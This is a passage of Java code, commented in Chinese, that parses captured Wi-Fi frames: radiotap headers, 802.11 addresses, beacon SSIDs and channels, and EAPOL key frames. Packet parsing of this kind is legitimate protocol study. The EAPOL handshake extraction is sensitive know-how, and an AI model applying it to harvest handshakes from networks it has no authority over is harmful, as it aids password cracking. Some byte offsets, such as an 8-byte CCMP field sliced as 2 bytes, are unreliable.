			String second_8_str = second_8 + "";
			if (second_8 < 10) {
				second_8_str = "0" + second_8;
			}

//		                long_time_stamp_test=1396710020801071 long_time_stamp_test.length=16
//		                                     1560950936695086634
			String time_stamp_style2_str = " " + year_8_str + "-" + month_8_str + "-" + day_8_str + "_" + hour_8_str
					+ ":" + minute_8_str + ":" + second_8_str + "." + long_time_stamp_ws + " long_time_stamp_test="
					+ long_time_stamp_test + " long_time_stamp_test.length=" + long_time_stamp_test.length()
					+ "  long_time_stamp_ms=" + long_time_stamp_ms + "  long_time_stamp_ws=" + long_time_stamp_ws;

//		                System.out.println(time_stamp_style2_str);

			timestamp_str = year_8_str + "-" + month_8_str + "-" + day_8_str + "_" + hour_8_str + ":" + minute_8_str
					+ ":" + second_8_str + "." + long_time_stamp_ws;
			// TimeStamp 时间戳 End ════════════════════════════════════

		}

		void Radiotap_Header_Parser() {
			Header_revision_1byte = Packet_Data_bytes[0];
			Header_pad_1byte = Packet_Data_bytes[0];
			Header_length_2bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, 2, 3);
			Present_flags_First_32bits_4bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, 4, 7);

			String Header_length_2bytes_hexstr = DigitalTransUtils.byte2hex(Header_length_2bytes, true);

			Header_length_Int = Integer.parseInt(clearZero_for_NumberStr(Header_length_2bytes_hexstr), 16);

			Radiotap_Header_bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, 0, Header_length_Int - 1);

			String Present_flags_32bits_4bytes_hexstr = DigitalTransUtils.byte2hex(Present_flags_First_32bits_4bytes,
					true);

			// A040402F
			if (isNumeric(Present_flags_32bits_4bytes_hexstr)) {
				Present_BitMsk_First_Int = Integer.parseInt(clearZero_for_NumberStr(Present_flags_32bits_4bytes_hexstr),
						16);

			} else {

				Present_BitMsk_First_Int = bytesToInt(Present_flags_First_32bits_4bytes, 0);

			}

			All_Present_BitMsk.add(Present_BitMsk_First_Int);

			int temp_mask = Present_BitMsk_First_Int;

			int mask_step = 4;
			// 有 下一个 present_mask 的 标识
			// 要在 这里 检查 是否 有 下一个 Present_BitMsk
			// All_Present_BitMsk
			int Present_BitMsk_Count = 0;
			Option_RadiotapPresent_Bit_ByteArr_Map.put(Present_BitMsk_Count,
					byteArr2List(Present_flags_First_32bits_4bytes));

			while ((temp_mask & radiotap_present_ext_32bit) != 0) {

				byte[] next_present_4bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, 4 + mask_step,
						7 + mask_step);

				String next_present_4bytes_hexstr = DigitalTransUtils.byte2hex(next_present_4bytes, true);
				temp_mask = Integer.parseInt(clearZero_for_NumberStr(next_present_4bytes_hexstr), 16);

				All_Present_BitMsk.add(temp_mask);
				mask_step += 4;
				Present_BitMsk_Count++;
				Option_RadiotapPresent_Bit_ByteArr_Map.put(Present_BitMsk_Count, byteArr2List(next_present_4bytes));

			}

			// 去检测 多个 present_falg 获得的 flag 放入 ArrayList<ArrayList<Integer>> 中
			for (int i = 0; i < All_Present_BitMsk.size(); i++) {

				for (int j = 0; j < All_RadiotapPresent_IntList.size(); j++) {
					ArrayList<Integer> matchPresentBitMsk_Int_List = new ArrayList<Integer>();
					int bitFeature = All_RadiotapPresent_IntList.get(j);

					if ((bitFeature & Present_BitMsk_First_Int) != 0) {
//				    		System.out.println("Present_BitMsk["+(j+1)+"] = 表现 ! ");
						matchPresentBitMsk_Int_List.add(bitFeature);
					}
					MultiPresent_IntList_List.add(matchPresentBitMsk_Int_List);
				}

			}

			// 解析出 总共多少个 precent , 这部分 不解析
			int dynamic_present_bytes_length = 0;
			int present_count = MultiPresent_IntList_List.size();
			int present_bitMsk_size = All_Present_BitMsk.size();
			for (int i = 0; i < MultiPresent_IntList_List.size(); i++) {

				ArrayList<Integer> one_item_present_List = MultiPresent_IntList_List.get(i);

				for (int j = 0; j < one_item_present_List.size(); j++) {

					int matchBit = one_item_present_List.get(j);

					String present_desc = All_RadiotapPresent_Bit_Desc_Map.get(matchBit);

					int matchBit_Length = Option_RadiotapPresent_Bit_ByteLength_Map.get(matchBit);
					dynamic_present_bytes_length += matchBit_Length;

//			    	System.out.println("present_size["+present_count+"] present_bitMsk_size["+present_bitMsk_size+"]  present["+(i+1)+"]  matchBit="+matchBit+"   bit_desc:"+present_desc+"  bit_length="+matchBit_Length +" dynamic_present_bytes_length="+dynamic_present_bytes_length);

				}
			}

//			    System.out.println(getClass().getSimpleName()+ "  dynamic_present_bytes_length = "+ dynamic_present_bytes_length);

		}

		void parse_wifi_frame(byte[] all_frame) {

			Block_Format_Parser(all_frame);

			Radiotap_Header_Parser();

			IE80211_Format_Parser();

		}

// STA 接受帧(DS=2)     RA    TA   DA    SA    八个 地址
// .... ..10 = DS status: Frame from DS to a STA via AP(To DS: 0 From DS: 1) (0x2)
//        E0 B9 A5 1F E7 94 【六个字节 wlan.ra == E0:B9:A5:1F:E7:94 接收Mac地址】
//        20 DC E6 4F 6C 90【六字节 传输Mac地址 wlan.ta == 20:DC:E6:4F:6C:90 】
//        20 DC E6 4F 6C 90【六字节 原Mac地址 wlan.sa ==20:DC:E6:4F:6C:90 】
//     没有 目的 DA , 目的地址 就是 RA 接收地址

// STA 发送帧(DS=1)
//.... ..01 = DS status: Frame from STA to DS via an AP (To DS: 1 From DS: 0) (0x1)
//     20 DC E6 4F 6C 90【六个字节 wlan.ra == 20 DC:E6:4F:6C:90 接收Mac地址】
//     E0 B9 A5 1F E7 94 【六字节  wlan.ta == E0:B9:A5:1F:E7:94 】
//     20 DC  E6 4F 6C 90 【六字节 目的Mac地址 wlan.da ==20:DC:E6:4F:6C:90 】
//

		void IE80211_Format_Parser() {
//    radiotrap 帧的  Header_length_Int 规定了 头的大小  那么 依据 此   就 可以得到  IE80211 格式的开头

			int wifi_type_begin_position_length1 = Header_length_Int;
			int wifi_type_end_position_length1 = Header_length_Int + 1 - 1;
			byte[] wifi_type_subtype_1bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_type_begin_position_length1, wifi_type_end_position_length1);
			if (wifi_type_subtype_1bytes != null && wifi_type_subtype_1bytes.length == 1) {

				wifi_type_subtype_1byte = wifi_type_subtype_1bytes[0];

				wifi_type_int = (wifi_type_subtype_1byte & 0x0C) >> 2; // 1100=C

				wifi_subtype_int = (wifi_type_subtype_1byte & 0xf0) >> 4;
			}

			int wifi_controlflag_begin_position_1bytes = wifi_type_end_position_length1 + 1;
			int wifi_controlflag_end_position_1bytes = wifi_controlflag_begin_position_1bytes + 1 - 1;

			byte[] wifi_control_flag_1bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_controlflag_begin_position_1bytes, wifi_controlflag_begin_position_1bytes);
			if (wifi_control_flag_1bytes != null && wifi_control_flag_1bytes.length == 1) {

				wifi_control_flag_1byte = wifi_control_flag_1bytes[0];

				wifi_is_receive_farme = ((wifi_control_flag_1byte & 0x02) == 0x02);

				wifi_is_protected = ((wifi_control_flag_1byte & 0x40) == 0x40);

			}

			int wifi_during_begin_position_2bytes = wifi_controlflag_end_position_1bytes + 1;
			int wifi_during_end_position_2bytes = wifi_during_begin_position_2bytes + 2 - 1;

			wifi_during_2bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_during_begin_position_2bytes,
					wifi_during_end_position_2bytes);

			// 解析完 common的 部分
			parser_WifiFrame_with_type_subtype(wifi_during_end_position_2bytes);

			// 依据 type-subtype 可能 还有 其余的 有的有 Qos两个字节 有的没有Qos字节 依据 type-subtype 结构还不一样
			// 有的只有两个地址 address
		}

		void type2_sub8_80211_qosdata_parser(int wifi_during_end_position_2bytes) {

			int wifi_ra_begin_position_6bytes = 0;
			int wifi_ra_end_position_6bytes = 0;
			int wifi_ta_begin_position_6bytes = 0;
			int wifi_ta_end_position_6bytes = 0;
			int wifi_da_begin_position_6bytes = 0;
			int wifi_da_end_position_6bytes = 0;
			int wifi_sa_begin_position_6bytes = 0;
			int wifi_sa_end_position_6bytes = 0;

			if (wifi_is_receive_farme) { // eap 接收帧 DS=10

				wifi_ra_begin_position_6bytes = wifi_during_end_position_2bytes + 1;
				wifi_ra_end_position_6bytes = wifi_ra_begin_position_6bytes + 6 - 1;
				wifi_ra_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ra_begin_position_6bytes,
						wifi_ra_end_position_6bytes);

				wifi_ta_begin_position_6bytes = wifi_ra_end_position_6bytes + 1;
				wifi_ta_end_position_6bytes = wifi_ta_begin_position_6bytes + 6 - 1;
				wifi_ta_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ta_begin_position_6bytes,
						wifi_ta_end_position_6bytes);

				// STA 接受帧 da 就是 ra 没有记录 DA 没有 DA
				wifi_da_6bytes = wifi_ra_6bytes;

				wifi_sa_begin_position_6bytes = wifi_ta_end_position_6bytes + 1;
				wifi_sa_end_position_6bytes = wifi_sa_begin_position_6bytes + 6 - 1;
				wifi_sa_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_sa_begin_position_6bytes,
						wifi_sa_end_position_6bytes);

				wifi_bssid_6bytes = wifi_ta_6bytes;

			} else { // eap 发送帧 DS=01

				wifi_ra_begin_position_6bytes = wifi_during_end_position_2bytes + 1;
				wifi_ra_end_position_6bytes = wifi_ra_begin_position_6bytes + 6 - 1;
				wifi_ra_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ra_begin_position_6bytes,
						wifi_ra_end_position_6bytes);

				wifi_ta_begin_position_6bytes = wifi_ra_end_position_6bytes + 1;
				wifi_ta_end_position_6bytes = wifi_ta_begin_position_6bytes + 6 - 1;
				wifi_ta_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ta_begin_position_6bytes,
						wifi_ta_end_position_6bytes);

				wifi_da_begin_position_6bytes = wifi_ta_end_position_6bytes + 1;
				wifi_da_end_position_6bytes = wifi_da_begin_position_6bytes + 6 - 1;

				wifi_sa_begin_position_6bytes = wifi_da_begin_position_6bytes;
				wifi_sa_end_position_6bytes = wifi_da_end_position_6bytes;

				wifi_da_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_da_begin_position_6bytes,
						wifi_da_end_position_6bytes);

				// STA 发送帧 sa 就是 ta , 没有 加载
				wifi_sa_6bytes = wifi_ta_6bytes;

				wifi_bssid_6bytes = wifi_ra_6bytes;

			}

			int wifi_sequence_frame_number_begin_position_2bytes = wifi_sa_end_position_6bytes + 1;
			int wifi_sequence_frame_number_end_position_2bytes = wifi_sequence_frame_number_begin_position_2bytes + 2
					- 1;

			wifi_high12bit_SequenceNumber_low4bit_FragmentNumber_2bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_sequence_frame_number_begin_position_2bytes, wifi_sequence_frame_number_end_position_2bytes);

			int wifi_qos_control_begin_position_2bytes = wifi_sequence_frame_number_end_position_2bytes + 1;
			int wifi_qos_control_end_position_2bytes = wifi_qos_control_begin_position_2bytes + 2 - 1;

			wifi_qos_control_2bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_qos_control_begin_position_2bytes, wifi_qos_control_end_position_2bytes);

			int wifi_ccmp_paramters_begin_position_8bytes = wifi_qos_control_end_position_2bytes + 1;
			int wifi_ccmp_paramters_end_position_8bytes = wifi_ccmp_paramters_begin_position_8bytes + 2 - 1;

			if (wifi_is_protected) { // 是 Qos-data 携带数据类型

				wifi_ccmp_paramters_begin_position_8bytes = wifi_qos_control_end_position_2bytes + 1;
				wifi_ccmp_paramters_end_position_8bytes = wifi_ccmp_paramters_begin_position_8bytes + 2 - 1;

				wifi_ccmp_paramters_8bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
						wifi_ccmp_paramters_begin_position_8bytes, wifi_ccmp_paramters_end_position_8bytes);

				// 结尾是 总长度 - 4 - 1

//
//			int  Original_Packet_Real_Length;
//			byte[] Packet_Data_bytes ;  // 内部协议的解析 包数据

				int wifi_qos_data_begin_position_8bytes = wifi_ccmp_paramters_end_position_8bytes + 1;
				int wifi_qos_data_end_position_8bytes = Original_Packet_Real_Length - 4 - 1;

				wifi_qos_data_bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
						wifi_qos_data_begin_position_8bytes, wifi_qos_data_end_position_8bytes);

				// frame_check_sequeue 是 数据包内最后的那四个字节
				wifi_qosdata_frame_check_sequeue_4bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
						Packet_Data_bytes.length - 8, Packet_Data_bytes.length - 4 - 1);

			}

		}

		// // beacon帧 DS=00
		void type0_sub8_80211_beacon_parser(int wifi_during_end_position_2bytes) {
			int wifi_ra_begin_position_6bytes = 0;
			int wifi_ra_end_position_6bytes = 0;
			int wifi_ta_begin_position_6bytes = 0;
			int wifi_ta_end_position_6bytes = 0;
			int wifi_da_begin_position_6bytes = 0;
			int wifi_da_end_position_6bytes = 0;
			int wifi_sa_begin_position_6bytes = 0;
			int wifi_sa_end_position_6bytes = 0;
			int wifi_bssid_begin_position_6bytes = 0;
			int wifi_bssid_end_position_6bytes = 0;

			wifi_ra_begin_position_6bytes = wifi_during_end_position_2bytes + 1;
			wifi_ra_end_position_6bytes = wifi_ra_begin_position_6bytes + 6 - 1;
			wifi_ra_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ra_begin_position_6bytes,
					wifi_ra_end_position_6bytes);

			// beacon 帧 da==sa
			wifi_da_6bytes = wifi_ra_6bytes;

			wifi_ta_begin_position_6bytes = wifi_ra_end_position_6bytes + 1;
			wifi_ta_end_position_6bytes = wifi_ta_begin_position_6bytes + 6 - 1;
			wifi_ta_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ta_begin_position_6bytes,
					wifi_ta_end_position_6bytes);

			wifi_sa_6bytes = wifi_ta_6bytes;

			wifi_bssid_begin_position_6bytes = wifi_ta_end_position_6bytes + 1;
			wifi_bssid_end_position_6bytes = wifi_bssid_begin_position_6bytes + 6 - 1;

			wifi_bssid_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_bssid_begin_position_6bytes,
					wifi_bssid_end_position_6bytes);

			int wifi_sequence_frame_number_begin_position_2bytes = wifi_bssid_end_position_6bytes + 1;
			int wifi_sequence_frame_number_end_position_2bytes = wifi_sequence_frame_number_begin_position_2bytes + 2
					- 1;

			wifi_high12bit_SequenceNumber_low4bit_FragmentNumber_2bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_sequence_frame_number_begin_position_2bytes, wifi_sequence_frame_number_end_position_2bytes);

			wifi_80211_wireless_management_beacon_bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_sequence_frame_number_end_position_2bytes + 1, Packet_Data_bytes.length - 4 - 1); // 最后有四个
			// Squeue
// 当前查询 子byte数组     beginIndex=42  endIndex=39  cur_byte_length=-2异常  请检查!  java.lang.NullPointerException
			if(wifi_80211_wireless_management_beacon_bytes == null) {
				return ;   //
			}
			System.out.println("wifi_80211_wireless_management_beacon_bytes.length = "
					+ wifi_80211_wireless_management_beacon_bytes.length);

			type0_sub8_beacon_80211_wireless_management_parser(wifi_80211_wireless_management_beacon_bytes);

		}

		void type0_sub8_beacon_80211_wireless_management_parser(byte[] beacon_management_bytes) {

			int beacon_management_fixed_paramter_timestamp_begin_position_8bytes = 0;
			int beacon_management_fixed_paramter_timestamp_end_position_8bytes = beacon_management_fixed_paramter_timestamp_begin_position_8bytes
					+ 8 - 1;

			// 8字节的 Timestamp
			byte[] beacon_management_fixed_paramter_timestamp_8bytes = beginIndex_endIndex_byteArr(
					beacon_management_bytes, beacon_management_fixed_paramter_timestamp_begin_position_8bytes,
					beacon_management_fixed_paramter_timestamp_end_position_8bytes);

			int beacon_management_fixed_paramter_beaconinternval_begin_position_2bytes = beacon_management_fixed_paramter_timestamp_end_position_8bytes
					+ 1;
			int beacon_management_fixed_paramter_beaconinternval_end_position_2bytes = beacon_management_fixed_paramter_beaconinternval_begin_position_2bytes
					+ 2 - 1;

			byte[] beacon_management_fixed_paramter_beaconinternval_2bytes = beginIndex_endIndex_byteArr(
					beacon_management_bytes, beacon_management_fixed_paramter_beaconinternval_begin_position_2bytes,
					beacon_management_fixed_paramter_beaconinternval_end_position_2bytes);

			int beacon_management_fixed_paramter_capainfo_begin_position_2bytes = beacon_management_fixed_paramter_beaconinternval_end_position_2bytes
					+ 1;
			int beacon_management_fixed_paramter_capainfo_end_position_2bytes = beacon_management_fixed_paramter_capainfo_begin_position_2bytes
					+ 2 - 1;
			byte[] beacon_management_fixed_paramter_capainfo_2bytes = beginIndex_endIndex_byteArr(
					beacon_management_bytes, beacon_management_fixed_paramter_capainfo_begin_position_2bytes,
					beacon_management_fixed_paramter_capainfo_end_position_2bytes);

			// Type-Length-Field
			// 0--【ssid-length】---ssid
			// 1--【channel-length】---channel

			int beacon_management_tagged_paramter_begin_position_optionbytes = beacon_management_fixed_paramter_capainfo_end_position_2bytes
					+ 1;

			int cur_tagged_position = beacon_management_tagged_paramter_begin_position_optionbytes;
			byte[] tagged_paramter_type_bytes;
			byte[] tagged_paramter_length_bytes;
			byte[] tagged_paramter_fields_bytes;

			while (cur_tagged_position < beacon_management_bytes.length - 2) {

				int tagged_paramter_type_begin_position_1bytes = cur_tagged_position;
				int tagged_paramter_type_end_position_1bytes = cur_tagged_position;

				tagged_paramter_type_bytes = beginIndex_endIndex_byteArr(beacon_management_bytes,
						tagged_paramter_type_begin_position_1bytes, tagged_paramter_type_end_position_1bytes);

				int tagged_paramter_length_begin_position_1bytes = tagged_paramter_type_end_position_1bytes + 1;
				int tagged_paramter_length_end_position_1bytes = tagged_paramter_length_begin_position_1bytes + 1 - 1;
				tagged_paramter_length_bytes = beginIndex_endIndex_byteArr(beacon_management_bytes,
						tagged_paramter_length_begin_position_1bytes, tagged_paramter_length_end_position_1bytes);

				int tagged_type_index = (int) (tagged_paramter_type_bytes[0]);
				int tagged_type_length = (int) (tagged_paramter_length_bytes[0] & 0x0FF);

				int tagged_paramter_field_begin_position_bytes = tagged_paramter_length_end_position_1bytes + 1;
				int tagged_paramter_field_end_position_bytes = tagged_paramter_field_begin_position_bytes
						+ tagged_type_length - 1;

				tagged_paramter_fields_bytes = beginIndex_endIndex_byteArr(beacon_management_bytes,
						tagged_paramter_field_begin_position_bytes, tagged_paramter_field_end_position_bytes);

				// 下一个 tagged_position 的 位置
				cur_tagged_position = tagged_paramter_field_end_position_bytes + 1;

				if (tagged_paramter_fields_bytes == null) {
//					System.out.println("package_number = "+package_number+" cur_tagged_position="+(cur_tagged_position)+" (beacon_management_bytes.length-2)="+(beacon_management_bytes.length -2)+"  tagged_paramter_field_begin_position_bytes="+tagged_paramter_field_begin_position_bytes+"  tagged_paramter_field_end_position_bytes="+tagged_paramter_field_end_position_bytes+"    tagged_type_index="+tagged_type_index+" tagged_type_length="+tagged_type_length+"   filed.length="+tagged_paramter_fields_bytes+"  == null");
					continue;
				} else {

//					System.out.println("package_number = "+package_number+" cur_tagged_position="+(cur_tagged_position)+" (beacon_management_bytes.length-2)="+(beacon_management_bytes.length -2)+"  tagged_paramter_field_begin_position_bytes="+tagged_paramter_field_begin_position_bytes+"  tagged_paramter_field_end_position_bytes="+tagged_paramter_field_end_position_bytes+"    tagged_type_index="+tagged_type_index+" tagged_type_length="+tagged_type_length+"   filed.length="+tagged_paramter_fields_bytes.length);

				}

				if (tagged_type_index == 0) { // ssid的typeid==0

					wifi_80211_wireless_management_beacon_ssid_bytes = tagged_paramter_fields_bytes;
					ssid_hexstr = bytesToHexString(wifi_80211_wireless_management_beacon_ssid_bytes);

					if (wifi_80211_wireless_management_beacon_ssid_bytes == null) {
						continue;
					}

					char[] ssid_char_arr = getChars(wifi_80211_wireless_management_beacon_ssid_bytes);
					String ssid_name_temp = new String(ssid_char_arr, 0,
							wifi_80211_wireless_management_beacon_ssid_bytes.length);

					ssid_name = ssid_name_temp;
//					System.out.println("ssid_hexstr="+ssid_hexstr +"   ssid_name="+ssid_name  );

				} else if (tagged_type_index == 3) { // typeid=3 就是 channel

//					byte[] wifi_80211_wireless_management_beacon_channel_bytes; // 当前热点频道的 字节数组
//					int wifi_80211_wireless_management_beacon_channel_id; //  频道id
//					int wifi_80211_wireless_management_beacon_channel_hz;  // id 对应的 赫兹频道

					byte[] wifi_80211_wireless_management_beacon_channel_bytes = tagged_paramter_fields_bytes;

					wifi_80211_wireless_management_beacon_channel_id = (int) (wifi_80211_wireless_management_beacon_channel_bytes[0]
							& 0x0FF);

//					System.out.println("wifi_80211_wireless_management_beacon_channel_id="+wifi_80211_wireless_management_beacon_channel_id   );

					wifi_80211_wireless_management_beacon_channel_hz = getChannelId_2_ChanneHz(
							wifi_80211_wireless_management_beacon_channel_id);

//					System.out.println("wifi_80211_wireless_management_beacon_channel_id="+wifi_80211_wireless_management_beacon_channel_id  +"    wifi_80211_wireless_management_beacon_channel_hz="+wifi_80211_wireless_management_beacon_channel_hz );

				}

			}

		}

		void type2_sub8_eapol_eap_tlvs_tcp_key_parser(int wifi_during_end_position_2bytes) {

			int wifi_ra_begin_position_6bytes = 0;
			int wifi_ra_end_position_6bytes = 0;
			int wifi_ta_begin_position_6bytes = 0;
			int wifi_ta_end_position_6bytes = 0;
			int wifi_da_begin_position_6bytes = 0;
			int wifi_da_end_position_6bytes = 0;
			int wifi_sa_begin_position_6bytes = 0;
			int wifi_sa_end_position_6bytes = 0;

			if (wifi_is_receive_farme) { // eap接收帧 DS=10

				wifi_ra_begin_position_6bytes = wifi_during_end_position_2bytes + 1;
				wifi_ra_end_position_6bytes = wifi_ra_begin_position_6bytes + 6 - 1;
				wifi_ra_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ra_begin_position_6bytes,
						wifi_ra_end_position_6bytes);

				wifi_ta_begin_position_6bytes = wifi_ra_end_position_6bytes + 1;
				wifi_ta_end_position_6bytes = wifi_ta_begin_position_6bytes + 6 - 1;
				wifi_ta_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ta_begin_position_6bytes,
						wifi_ta_end_position_6bytes);

				// STA 接受帧 da 就是 ra 没有记录 DA 没有 DA
				wifi_da_6bytes = wifi_ra_6bytes;

				wifi_sa_begin_position_6bytes = wifi_ta_end_position_6bytes + 1;
				wifi_sa_end_position_6bytes = wifi_sa_begin_position_6bytes + 6 - 1;
				wifi_sa_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_sa_begin_position_6bytes,
						wifi_sa_end_position_6bytes);

				wifi_bssid_6bytes = wifi_ta_6bytes;

			} else { // eap 发送帧 DS=01

				wifi_ra_begin_position_6bytes = wifi_during_end_position_2bytes + 1;
				wifi_ra_end_position_6bytes = wifi_ra_begin_position_6bytes + 6 - 1;
				wifi_ra_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ra_begin_position_6bytes,
						wifi_ra_end_position_6bytes);

				wifi_ta_begin_position_6bytes = wifi_ra_end_position_6bytes + 1;
				wifi_ta_end_position_6bytes = wifi_ta_begin_position_6bytes + 6 - 1;
				wifi_ta_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_ta_begin_position_6bytes,
						wifi_ta_end_position_6bytes);

				wifi_da_begin_position_6bytes = wifi_ta_end_position_6bytes + 1;
				wifi_da_end_position_6bytes = wifi_da_begin_position_6bytes + 6 - 1;

				wifi_sa_begin_position_6bytes = wifi_da_begin_position_6bytes;
				wifi_sa_end_position_6bytes = wifi_da_end_position_6bytes;

				wifi_da_6bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes, wifi_da_begin_position_6bytes,
						wifi_da_end_position_6bytes);

				// STA 发送帧 sa 就是 ta , 没有 加载
				wifi_sa_6bytes = wifi_ta_6bytes;

				wifi_bssid_6bytes = wifi_ra_6bytes;

			}

			int wifi_sequence_frame_number_begin_position_2bytes = wifi_sa_end_position_6bytes + 1;
			int wifi_sequence_frame_number_end_position_2bytes = wifi_sequence_frame_number_begin_position_2bytes + 2
					- 1;

			wifi_high12bit_SequenceNumber_low4bit_FragmentNumber_2bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_sequence_frame_number_begin_position_2bytes, wifi_sequence_frame_number_end_position_2bytes);

			int wifi_qos_data_begin_position_2bytes = wifi_sequence_frame_number_end_position_2bytes + 1;
			int wifi_qos_data_end_position_2bytes = wifi_qos_data_begin_position_2bytes + 2 - 1;

			wifi_qos_control_2bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_qos_data_begin_position_2bytes, wifi_qos_data_end_position_2bytes);

			int wifi_logical_link_conteolflag_begin_position_8bytes = wifi_qos_data_end_position_2bytes + 1;
			int wifi_logical_link_conteolflag_end_position_8bytes = wifi_logical_link_conteolflag_begin_position_8bytes
					+ 8 - 1;

			wifi_logical_link_conteolflag_8bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
					wifi_logical_link_conteolflag_begin_position_8bytes,
					wifi_logical_link_conteolflag_end_position_8bytes);

			if(wifi_logical_link_conteolflag_8bytes == null) {

				return;
			}
			byte[] wifi_logical_link_type_2bytes_temp = {
					wifi_logical_link_conteolflag_8bytes[wifi_logical_link_conteolflag_8bytes.length - 1],
					wifi_logical_link_conteolflag_8bytes[wifi_logical_link_conteolflag_8bytes.length - 2] };

			wifi_logical_link_type_2bytes = wifi_logical_link_type_2bytes_temp;

			wifi_logical_link_type_2bytes_hexstr = bytesToHexString(wifi_logical_link_type_2bytes, true); // 小端显示

			if (wifi_logical_link_type_2bytes_hexstr != null) {
				wifi_logical_link_type_2bytes_hexstr = wifi_logical_link_type_2bytes_hexstr.toLowerCase().trim();
			}
			// 要 依据 wifi_logical_link_type_2bytes 的 不同进一步 判断

			if (wifi_logical_link_type_2bytes_hexstr == null) {

				System.out.println(
						"当前 读取 wifi_logical_link_type_2bytes 解析出的 wifi_logical_link_type_2bytes_hexstr 为空 请检查 !  wifi_logical_link_type_2bytes="
								+ wifi_logical_link_type_2bytes);
				return;
			}

			// 当前 读取到的 位置 int wifi_logical_link_conteolflag_end_position_8bytes
			switch (wifi_logical_link_type_2bytes_hexstr) {

				case "888e": // eapol--888e eap-888e

//	        byte[] wifi_8021x_auth_version_1byte;  // Version: 802.1X-2001 (1)
//	        byte[] wifi_8021x_auth_type_1byte;  // eapol==3   eap=0
//	        byte[] wifi_8021x_auth_length_2byte;

					int wifi_8021x_auth_version_begin_position_1byte = wifi_logical_link_conteolflag_end_position_8bytes
							+ 1;
					int wifi_8021x_auth_version_end_position_1byte = wifi_8021x_auth_version_begin_position_1byte + 1 - 1;
					wifi_8021x_auth_version_1byte = beginIndex_endIndex_byteArr(Packet_Data_bytes,
							wifi_8021x_auth_version_begin_position_1byte, wifi_8021x_auth_version_end_position_1byte);

					int wifi_8021x_auth_type_begin_position_1byte = wifi_8021x_auth_version_end_position_1byte + 1;
					int wifi_8021x_auth_type_end_position_1byte = wifi_8021x_auth_type_begin_position_1byte + 1 - 1;
					wifi_8021x_auth_type_1byte = beginIndex_endIndex_byteArr(Packet_Data_bytes,
							wifi_8021x_auth_type_begin_position_1byte, wifi_8021x_auth_type_end_position_1byte);

					int wifi_8021x_auth_length_begin_position_2byte = wifi_8021x_auth_type_end_position_1byte + 1;
					int wifi_8021x_auth_length_end_position_2byte = wifi_8021x_auth_length_begin_position_2byte + 2 - 1;
					wifi_8021x_auth_length_2byte = beginIndex_endIndex_byteArr(Packet_Data_bytes,
							wifi_8021x_auth_length_begin_position_2byte, wifi_8021x_auth_length_end_position_2byte);

					wifi_8021x_auth_version_int = wifi_8021x_auth_version_1byte[0];
					wifi_8021x_auth_type_int = wifi_8021x_auth_type_1byte[0];

					wifi_8021x_auth_length_int = merge2ByteToInt(wifi_8021x_auth_length_2byte[0],
							wifi_8021x_auth_length_2byte[1]);

					if (wifi_8021x_auth_type_int == 3) { // eapol帧

						int wifi_8021x_auth_data_begin_position_bytes = wifi_8021x_auth_length_end_position_2byte + 1;
						int wifi_8021x_auth_data_end_position_bytes = wifi_8021x_auth_data_begin_position_bytes
								+ wifi_8021x_auth_length_int - 1;
						wifi_eapol_auth_data_bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
								wifi_8021x_auth_data_begin_position_bytes, wifi_8021x_auth_data_end_position_bytes);

						// 所有的 auth data 包含 length
						wifi_eapol_all_data_bytes = beginIndex_endIndex_byteArr(Packet_Data_bytes,
								wifi_8021x_auth_version_begin_position_1byte, wifi_8021x_auth_data_end_position_bytes);

						parser_80211_eap_frame(wifi_eapol_auth_data_bytes); // 开始解析 eapol-data 的 数据

					} else if (wifi_8021x_auth_type_int == 0) { // eap tlsv1.2 等 其他帧

					}

					break;

				case "0806": // arp--0806

					break;

				case "0800": // dns--0800 tlsv1.2

					break;

				default:
					System.out.println(
							" wifi_logical_link_type_2bytes_hexstr=" + wifi_logical_link_type_2bytes_hexstr + " 不清楚什么类型");

			}

		}

		void parser_80211_eap_frame(byte[] eapolDataBytes) {
			int eap_key_desc_begin_position_1byte = 0;
			int eap_key_desc_end_position_1byte = eap_key_desc_begin_position_1byte + 1 - 1;

			eap_key_desc_1bytes = beginIndex_endIndex_byteArr(eapolDataBytes, eap_key_desc_begin_position_1byte,
					eap_key_desc_end_position_1byte);

			int eap_key_info_begin_position_2byte = eap_key_desc_end_position_1byte + 1;
			int eap_key_info_end_position_2byte = eap_key_info_begin_position_2byte + 2 - 1;
			eap_key_info_2bytes = beginIndex_endIndex_byteArr(eapolDataBytes, eap_key_info_begin_position_2byte,
					eap_key_info_end_position_2byte);

			int eap_key_length_begin_position_2byte = eap_key_info_end_position_2byte + 1;
			int eap_key_length_end_position_2byte = eap_key_length_begin_position_2byte + 2 - 1;
